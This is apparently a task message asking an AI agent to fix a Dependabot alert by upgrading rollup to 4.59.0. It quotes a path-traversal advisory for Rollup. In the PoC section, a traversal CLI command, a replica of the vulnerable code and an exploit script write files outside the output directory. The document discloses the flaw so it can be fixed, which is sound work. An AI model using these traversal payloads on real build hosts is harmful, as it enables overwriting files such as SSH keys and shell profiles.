@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** rollup (npm)
- **Severity:** HIGH
- **Vulnerable versions:** >= 4.0.0, < 4.59.0
- **Patched version:** 4.59.0
- **CVE:** CVE-2026-27606
- **GHSA:** GHSA-mw96-cpmx-2vgc
- **Manifest:** pnpm-lock.yaml

**Summary:**
Rollup 4 has Arbitrary File Write via Path Traversal

**Description:**
### Summary
The Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files.

### Details
The vulnerability is caused by the combination of two flawed components in the Rollup core:

1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\`). 
    ```typescript
    // src/utils/sanitizeFileName.ts (Line 3)
    const INVALID_CHAR_REGEX = /[\u0000-\u001F"#$%&*+,:;<=>?[\]^`{|}\u007F]/g;
    ```
    This allows path traversal sequences like `../../` to pass through the sanitizer unmodified.

2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the "sanitized" filename.
    ```typescript
    // src/rollup/rollup.ts (Line 317)
    const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName);
    ```
    Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write.

### PoC
A demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file.

**Scenario: CLI Named Input Exploit**
1.  Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`).
2.  Execute Rollup with a specifically crafted named input where the key contains traversal characters:
    ```bash
    rollup --input "a/../../pwned.js=main.js" --dir dist
    ```
3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder.

**Reproduction Files provided :**
*   `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug.
*   `exploit.py`: Automated script to run the PoC and verify the file escape.

vuln_app.js
```js
const path = require('path');
const fs = require('fs');

/**
 * REPLICATED ROLLUP VULNERABILITY
 * 
 * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts)
 * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)
 */

function sanitize(name) {
    // The vulnerability: Rollup's regex fails to strip dots and slashes, 
    // allowing path traversal sequences like '../'
    return name.replace(/[\u0000-\u001F"#$%&*+,:;<=>?[\]^`{|}\u007F]/g, '_');
}

async function build(userSuppliedName) {
    const outputDir = path.join(__dirname, 'dist');
    const fileName = sanitize(userSuppliedName);

    // Vulnerability: path.resolve() follows traversal sequences in the filename
    const outputPath = path.resolve(outputDir, fileName);

    console.log(`[*] Target write path: ${outputPath}`);

    if (!fs.existsSync(path.dirname(outputPath))) {
        fs.mkdirSync(path.dirname(outputPath), { recursive: true });
    }

    fs.writeFileSync(outputPath, 'console.log("System Compromised!");');
    console.log(`[+] File written successfully.`);
}

build(process.argv[2] || 'bundle.js');

```

exploit.py
```py
import subprocess
from pathlib import Path

def run_poc():
    # Target a file outside the 'dist' folder
    poc_dir = Path(__file__).parent
    malicious_filename = "../pwned_by_rollup.js"
    target_path = poc_dir / "pwned_by_rollup.js"

    print(f"=== Rollup Path Traversal PoC ===")
    print(f"[*] Malicious Filename: {malicious_filename}")
    
    # Trigger the vulnerable app
    subprocess.run(["node", "poc/vuln_app.js", malicious_filename])

    if target_path.exists():
        print(f"[SUCCESS] File escaped 'dist' folder!")
        print(f"[SUCCESS] Created: {target_path}")
        # target_path.unlink() # Cleanup
    else:
        print("[FAILED] Exploit did not work.")

if __name__ == "__main__":
    run_poc()
```

## POC 
```rollup --input "bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js" --dir dist```

<img width="1918" height="1111" alt="image" src="https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4" />



### Impact
This is a **High** level of severity vulnerability.
*   **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges.
*   **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase.
*   **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/866)
